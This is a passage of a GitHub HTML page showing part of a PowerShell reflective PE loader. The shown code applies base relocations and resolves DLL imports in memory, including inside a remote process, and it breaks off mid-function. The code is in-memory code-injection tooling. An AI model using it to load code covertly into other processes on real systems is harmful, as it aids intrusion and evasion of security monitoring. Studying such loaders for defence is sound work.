          <td id="L1727" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1727"></td>
          <td id="LC1727" class="blob-code blob-code-inner js-file-line">				[<span class="pl-k">UInt16</span>]<span class="pl-smi">$RelocOffset</span> <span class="pl-k">=</span> <span class="pl-smi">$RelocationInfo</span> <span class="pl-k">-band</span> <span class="pl-c1">0x0FFF</span></td>
        </tr>
        <tr>
          <td id="L1728" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1728"></td>
          <td id="LC1728" class="blob-code blob-code-inner js-file-line">				[<span class="pl-k">UInt16</span>]<span class="pl-smi">$RelocType</span> <span class="pl-k">=</span> <span class="pl-smi">$RelocationInfo</span> <span class="pl-k">-band</span> <span class="pl-c1">0xF000</span></td>
        </tr>
        <tr>
          <td id="L1729" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1729"></td>
          <td id="LC1729" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">for</span> (<span class="pl-smi">$j</span> <span class="pl-k">=</span> <span class="pl-c1">0</span>; <span class="pl-smi">$j</span> <span class="pl-k">-lt</span> <span class="pl-c1">12</span>; <span class="pl-smi">$j</span><span class="pl-k">++</span>)</td>
        </tr>
        <tr>
          <td id="L1730" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1730"></td>
          <td id="LC1730" class="blob-code blob-code-inner js-file-line">				{</td>
        </tr>
        <tr>
          <td id="L1731" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1731"></td>
          <td id="LC1731" class="blob-code blob-code-inner js-file-line">					<span class="pl-smi">$RelocType</span> <span class="pl-k">=</span> [<span class="pl-k">Math</span>]::Floor(<span class="pl-smi">$RelocType</span> <span class="pl-k">/</span> <span class="pl-c1">2</span>)</td>
        </tr>
        <tr>
          <td id="L1732" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1732"></td>
          <td id="LC1732" class="blob-code blob-code-inner js-file-line">				}</td>
        </tr>
        <tr>
          <td id="L1733" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1733"></td>
          <td id="LC1733" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1734" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1734"></td>
          <td id="LC1734" class="blob-code blob-code-inner js-file-line">				<span class="pl-c"><span class="pl-c">#</span>For DLL&#39;s there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.</span></td>
        </tr>
        <tr>
          <td id="L1735" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1735"></td>
          <td id="LC1735" class="blob-code blob-code-inner js-file-line">				<span class="pl-c"><span class="pl-c">#</span>This appears to be true for EXE&#39;s as well.</span></td>
        </tr>
        <tr>
          <td id="L1736" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1736"></td>
          <td id="LC1736" class="blob-code blob-code-inner js-file-line">				<span class="pl-c"><span class="pl-c">#</span>	Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx</span></td>
        </tr>
        <tr>
          <td id="L1737" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1737"></td>
          <td id="LC1737" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">if</span> ((<span class="pl-smi">$RelocType</span> <span class="pl-k">-eq</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.IMAGE_REL_BASED_HIGHLOW</span></span>) <span class="pl-k">`</span></td>
        </tr>
        <tr>
          <td id="L1738" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1738"></td>
          <td id="LC1738" class="blob-code blob-code-inner js-file-line">						<span class="pl-k">-or</span> (<span class="pl-smi">$RelocType</span> <span class="pl-k">-eq</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.IMAGE_REL_BASED_DIR64</span></span>))</td>
        </tr>
        <tr>
          <td id="L1739" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1739"></td>
          <td id="LC1739" class="blob-code blob-code-inner js-file-line">				{			</td>
        </tr>
        <tr>
          <td id="L1740" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1740"></td>
          <td id="LC1740" class="blob-code blob-code-inner js-file-line">					<span class="pl-c"><span class="pl-c">#</span>Get the current memory address and update it based off the difference between PE expected base address and actual base address</span></td>
        </tr>
        <tr>
          <td id="L1741" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1741"></td>
          <td id="LC1741" class="blob-code blob-code-inner js-file-line">					[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$FinalAddr</span> <span class="pl-k">=</span> [<span class="pl-k">IntPtr</span>](<span class="pl-c1">Add-SignedIntAsUnsigned</span> ([<span class="pl-k">Int64</span>]<span class="pl-smi">$MemAddrBase</span>) ([<span class="pl-k">Int64</span>]<span class="pl-smi">$RelocOffset</span>))</td>
        </tr>
        <tr>
          <td id="L1742" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1742"></td>
          <td id="LC1742" class="blob-code blob-code-inner js-file-line">					[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$CurrAddr</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::PtrToStructure(<span class="pl-smi">$FinalAddr</span><span class="pl-k">,</span> [<span class="pl-k">Type</span>][<span class="pl-k">IntPtr</span>])</td>
        </tr>
        <tr>
          <td id="L1743" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1743"></td>
          <td id="LC1743" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1744" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1744"></td>
          <td id="LC1744" class="blob-code blob-code-inner js-file-line">					<span class="pl-k">if</span> (<span class="pl-smi">$AddDifference</span> <span class="pl-k">-eq</span> <span class="pl-c1">$true</span>)</td>
        </tr>
        <tr>
          <td id="L1745" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1745"></td>
          <td id="LC1745" class="blob-code blob-code-inner js-file-line">					{</td>
        </tr>
        <tr>
          <td id="L1746" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1746"></td>
          <td id="LC1746" class="blob-code blob-code-inner js-file-line">						[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$CurrAddr</span> <span class="pl-k">=</span> [<span class="pl-k">IntPtr</span>](<span class="pl-c1">Add-SignedIntAsUnsigned</span> ([<span class="pl-k">Int64</span>]<span class="pl-smi">$CurrAddr</span>) (<span class="pl-smi">$BaseDifference</span>))</td>
        </tr>
        <tr>
          <td id="L1747" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1747"></td>
          <td id="LC1747" class="blob-code blob-code-inner js-file-line">					}</td>
        </tr>
        <tr>
          <td id="L1748" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1748"></td>
          <td id="LC1748" class="blob-code blob-code-inner js-file-line">					<span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="L1749" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1749"></td>
          <td id="LC1749" class="blob-code blob-code-inner js-file-line">					{</td>
        </tr>
        <tr>
          <td id="L1750" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1750"></td>
          <td id="LC1750" class="blob-code blob-code-inner js-file-line">						[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$CurrAddr</span> <span class="pl-k">=</span> [<span class="pl-k">IntPtr</span>](Sub<span class="pl-k">-</span>SignedIntAsUnsigned ([<span class="pl-k">Int64</span>]<span class="pl-smi">$CurrAddr</span>) (<span class="pl-smi">$BaseDifference</span>))</td>
        </tr>
        <tr>
          <td id="L1751" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1751"></td>
          <td id="LC1751" class="blob-code blob-code-inner js-file-line">					}				</td>
        </tr>
        <tr>
          <td id="L1752" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1752"></td>
          <td id="LC1752" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1753" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1753"></td>
          <td id="LC1753" class="blob-code blob-code-inner js-file-line">					[<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::StructureToPtr(<span class="pl-smi">$CurrAddr</span><span class="pl-k">,</span> <span class="pl-smi">$FinalAddr</span><span class="pl-k">,</span> <span class="pl-c1">$false</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L1754" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1754"></td>
          <td id="LC1754" class="blob-code blob-code-inner js-file-line">				}</td>
        </tr>
        <tr>
          <td id="L1755" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1755"></td>
          <td id="LC1755" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">elseif</span> (<span class="pl-smi">$RelocType</span> <span class="pl-k">-ne</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.IMAGE_REL_BASED_ABSOLUTE</span></span>)</td>
        </tr>
        <tr>
          <td id="L1756" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1756"></td>
          <td id="LC1756" class="blob-code blob-code-inner js-file-line">				{</td>
        </tr>
        <tr>
          <td id="L1757" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1757"></td>
          <td id="LC1757" class="blob-code blob-code-inner js-file-line">					<span class="pl-c"><span class="pl-c">#</span>IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don&#39;t actually do anything with it</span></td>
        </tr>
        <tr>
          <td id="L1758" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1758"></td>
          <td id="LC1758" class="blob-code blob-code-inner js-file-line">					<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Unknown relocation found, relocation value: <span class="pl-smi">$RelocType</span>, relocationinfo: <span class="pl-smi">$RelocationInfo</span><span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L1759" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1759"></td>
          <td id="LC1759" class="blob-code blob-code-inner js-file-line">				}</td>
        </tr>
        <tr>
          <td id="L1760" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1760"></td>
          <td id="LC1760" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L1761" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1761"></td>
          <td id="LC1761" class="blob-code blob-code-inner js-file-line">			</td>
        </tr>
        <tr>
          <td id="L1762" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1762"></td>
          <td id="LC1762" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$BaseRelocPtr</span> <span class="pl-k">=</span> [<span class="pl-k">IntPtr</span>](<span class="pl-c1">Add-SignedIntAsUnsigned</span> ([<span class="pl-k">Int64</span>]<span class="pl-smi">$BaseRelocPtr</span>) ([<span class="pl-k">Int64</span>]<span class="pl-smi">$BaseRelocationTable<span class="pl-smi">.SizeOfBlock</span></span>))</td>
        </tr>
        <tr>
          <td id="L1763" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1763"></td>
          <td id="LC1763" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L1764" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1764"></td>
          <td id="LC1764" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="L1765" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1765"></td>
          <td id="LC1765" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1766" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1766"></td>
          <td id="LC1766" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1767" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1767"></td>
          <td id="LC1767" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">Function</span> <span class="pl-en">Import-DllImports</span></td>
        </tr>
        <tr>
          <td id="L1768" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1768"></td>
          <td id="LC1768" class="blob-code blob-code-inner js-file-line">	{</td>
        </tr>
        <tr>
          <td id="L1769" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1769"></td>
          <td id="LC1769" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">Param</span>(</td>
        </tr>
        <tr>
          <td id="L1770" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1770"></td>
          <td id="LC1770" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">0</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L1771" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1771"></td>
          <td id="LC1771" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">System.Object</span>]</td>
        </tr>
        <tr>
          <td id="L1772" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1772"></td>
          <td id="LC1772" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$PEInfo</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L1773" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1773"></td>
          <td id="LC1773" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1774" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1774"></td>
          <td id="LC1774" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">1</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L1775" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1775"></td>
          <td id="LC1775" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">System.Object</span>]</td>
        </tr>
        <tr>
          <td id="L1776" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1776"></td>
          <td id="LC1776" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L1777" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1777"></td>
          <td id="LC1777" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1778" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1778"></td>
          <td id="LC1778" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">2</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L1779" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1779"></td>
          <td id="LC1779" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">System.Object</span>]</td>
        </tr>
        <tr>
          <td id="L1780" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1780"></td>
          <td id="LC1780" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Types</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L1781" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1781"></td>
          <td id="LC1781" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1782" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1782"></td>
          <td id="LC1782" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">3</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L1783" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1783"></td>
          <td id="LC1783" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">System.Object</span>]</td>
        </tr>
        <tr>
          <td id="L1784" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1784"></td>
          <td id="LC1784" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Constants</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L1785" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1785"></td>
          <td id="LC1785" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1786" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1786"></td>
          <td id="LC1786" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">4</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$false</span>)]</td>
        </tr>
        <tr>
          <td id="L1787" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1787"></td>
          <td id="LC1787" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">IntPtr</span>]</td>
        </tr>
        <tr>
          <td id="L1788" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1788"></td>
          <td id="LC1788" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$RemoteProcHandle</span></td>
        </tr>
        <tr>
          <td id="L1789" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1789"></td>
          <td id="LC1789" class="blob-code blob-code-inner js-file-line">		)</td>
        </tr>
        <tr>
          <td id="L1790" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1790"></td>
          <td id="LC1790" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1791" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1791"></td>
          <td id="LC1791" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$RemoteLoading</span> <span class="pl-k">=</span> <span class="pl-c1">$false</span></td>
        </tr>
        <tr>
          <td id="L1792" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1792"></td>
          <td id="LC1792" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$PEInfo<span class="pl-smi">.PEHandle</span></span> <span class="pl-k">-ne</span> <span class="pl-smi">$PEInfo<span class="pl-smi">.EffectivePEHandle</span></span>)</td>
        </tr>
        <tr>
          <td id="L1793" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1793"></td>
          <td id="LC1793" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L1794" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1794"></td>
          <td id="LC1794" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$RemoteLoading</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span></td>
        </tr>
        <tr>
          <td id="L1795" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1795"></td>
          <td id="LC1795" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L1796" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1796"></td>
          <td id="LC1796" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1797" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1797"></td>
          <td id="LC1797" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$PEInfo<span class="pl-smi">.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size</span></span> <span class="pl-k">-gt</span> <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="L1798" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1798"></td>
          <td id="LC1798" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L1799" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1799"></td>
          <td id="LC1799" class="blob-code blob-code-inner js-file-line">			[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$ImportDescriptorPtr</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> ([<span class="pl-k">Int64</span>]<span class="pl-smi">$PEInfo<span class="pl-smi">.PEHandle</span></span>) ([<span class="pl-k">Int64</span>]<span class="pl-smi">$PEInfo<span class="pl-smi">.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress</span></span>)</td>
        </tr>
        <tr>
          <td id="L1800" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1800"></td>
          <td id="LC1800" class="blob-code blob-code-inner js-file-line">			</td>
        </tr>
        <tr>
          <td id="L1801" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1801"></td>
          <td id="LC1801" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">while</span> (<span class="pl-c1">$true</span>)</td>
        </tr>
        <tr>
          <td id="L1802" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1802"></td>
          <td id="LC1802" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L1803" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1803"></td>
          <td id="LC1803" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$ImportDescriptor</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::PtrToStructure(<span class="pl-smi">$ImportDescriptorPtr</span><span class="pl-k">,</span> [<span class="pl-k">Type</span>]<span class="pl-smi">$Win32Types<span class="pl-smi">.IMAGE_IMPORT_DESCRIPTOR</span></span>)</td>
        </tr>
        <tr>
          <td id="L1804" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1804"></td>
          <td id="LC1804" class="blob-code blob-code-inner js-file-line">				</td>
        </tr>
        <tr>
          <td id="L1805" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1805"></td>
          <td id="LC1805" class="blob-code blob-code-inner js-file-line">				<span class="pl-c"><span class="pl-c">#</span>If the structure is null, it signals that this is the end of the array</span></td>
        </tr>
        <tr>
          <td id="L1806" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1806"></td>
          <td id="LC1806" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">if</span> (<span class="pl-smi">$ImportDescriptor<span class="pl-smi">.Characteristics</span></span> <span class="pl-k">-eq</span> <span class="pl-c1">0</span> <span class="pl-k">`</span></td>
        </tr>
        <tr>
          <td id="L1807" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1807"></td>
          <td id="LC1807" class="blob-code blob-code-inner js-file-line">						<span class="pl-k">-and</span> <span class="pl-smi">$ImportDescriptor<span class="pl-smi">.FirstThunk</span></span> <span class="pl-k">-eq</span> <span class="pl-c1">0</span> <span class="pl-k">`</span></td>
        </tr>
        <tr>
          <td id="L1808" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1808"></td>
          <td id="LC1808" class="blob-code blob-code-inner js-file-line">						<span class="pl-k">-and</span> <span class="pl-smi">$ImportDescriptor<span class="pl-smi">.ForwarderChain</span></span> <span class="pl-k">-eq</span> <span class="pl-c1">0</span> <span class="pl-k">`</span></td>
        </tr>
        <tr>
          <td id="L1809" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1809"></td>
          <td id="LC1809" class="blob-code blob-code-inner js-file-line">						<span class="pl-k">-and</span> <span class="pl-smi">$ImportDescriptor<span class="pl-smi">.Name</span></span> <span class="pl-k">-eq</span> <span class="pl-c1">0</span> <span class="pl-k">`</span></td>
        </tr>
        <tr>
          <td id="L1810" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1810"></td>
          <td id="LC1810" class="blob-code blob-code-inner js-file-line">						<span class="pl-k">-and</span> <span class="pl-smi">$ImportDescriptor<span class="pl-smi">.TimeDateStamp</span></span> <span class="pl-k">-eq</span> <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="L1811" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1811"></td>
          <td id="LC1811" class="blob-code blob-code-inner js-file-line">				{</td>
        </tr>
        <tr>
          <td id="L1812" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1812"></td>
          <td id="LC1812" class="blob-code blob-code-inner js-file-line">					<span class="pl-c1">Write-Verbose</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Done importing DLL imports<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L1813" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1813"></td>
          <td id="LC1813" class="blob-code blob-code-inner js-file-line">					<span class="pl-k">break</span></td>
        </tr>
        <tr>
          <td id="L1814" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1814"></td>
          <td id="LC1814" class="blob-code blob-code-inner js-file-line">				}</td>
        </tr>
        <tr>
          <td id="L1815" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1815"></td>
          <td id="LC1815" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1816" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1816"></td>
          <td id="LC1816" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$ImportDllHandle</span> <span class="pl-k">=</span> [<span class="pl-k">IntPtr</span>]::Zero</td>
        </tr>
        <tr>
          <td id="L1817" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1817"></td>
          <td id="LC1817" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$ImportDllPathPtr</span> <span class="pl-k">=</span> (<span class="pl-c1">Add-SignedIntAsUnsigned</span> ([<span class="pl-k">Int64</span>]<span class="pl-smi">$PEInfo<span class="pl-smi">.PEHandle</span></span>) ([<span class="pl-k">Int64</span>]<span class="pl-smi">$ImportDescriptor<span class="pl-smi">.Name</span></span>))</td>
        </tr>
        <tr>
          <td id="L1818" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1818"></td>
          <td id="LC1818" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$ImportDllPath</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::PtrToStringAnsi(<span class="pl-smi">$ImportDllPathPtr</span>)</td>
        </tr>
        <tr>
          <td id="L1819" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1819"></td>
          <td id="LC1819" class="blob-code blob-code-inner js-file-line">				</td>
        </tr>
        <tr>
          <td id="L1820" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1820"></td>
          <td id="LC1820" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">if</span> (<span class="pl-smi">$RemoteLoading</span> <span class="pl-k">-eq</span> <span class="pl-c1">$true</span>)</td>
        </tr>
        <tr>
          <td id="L1821" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1821"></td>
          <td id="LC1821" class="blob-code blob-code-inner js-file-line">				{</td>
        </tr>
        <tr>
          <td id="L1822" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1822"></td>
          <td id="LC1822" class="blob-code blob-code-inner js-file-line">					<span class="pl-smi">$ImportDllHandle</span> <span class="pl-k">=</span> <span class="pl-c1">Import-DllInRemoteProcess</span> <span class="pl-k">-</span>RemoteProcHandle <span class="pl-smi">$RemoteProcHandle</span> <span class="pl-k">-</span>ImportDllPathPtr <span class="pl-smi">$ImportDllPathPtr</span></td>
        </tr>
        <tr>
          <td id="L1823" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1823"></td>
          <td id="LC1823" class="blob-code blob-code-inner js-file-line">				}</td>
        </tr>
        <tr>
          <td id="L1824" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1824"></td>
          <td id="LC1824" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="L1825" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1825"></td>
          <td id="LC1825" class="blob-code blob-code-inner js-file-line">				{</td>
        </tr>
        <tr>
          <td id="L1826" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1826"></td>
          <td id="LC1826" class="blob-code blob-code-inner js-file-line">					<span class="pl-smi">$ImportDllHandle</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.LoadLibrary.Invoke</span></span>(<span class="pl-smi">$ImportDllPath</span>)</td>
        </tr>
        <tr>
          <td id="L1827" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1827"></td>
